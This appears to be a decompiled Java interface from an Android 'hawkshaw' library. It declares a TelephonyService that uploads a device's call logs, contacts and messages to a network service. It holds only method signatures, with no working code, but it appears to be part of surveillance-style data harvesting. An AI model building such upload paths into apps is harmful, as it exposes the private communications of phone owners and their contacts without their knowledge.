package com.hawkshaw.library.datalayer.network.service;

import a3.e;
import com.hawkshaw.library.datalayer.models.PushCallLogsRequest;
import com.hawkshaw.library.datalayer.models.PushContactsRequest;
import com.hawkshaw.library.datalayer.models.PushMessagesRequest;

public interface TelephonyService {
    Object pushCallLogs(PushCallLogsRequest pushCallLogsRequest, e eVar);

    Object pushContacts(PushContactsRequest pushContactsRequest, e eVar);

    Object pushMessages(PushMessagesRequest pushMessagesRequest, e eVar);
}
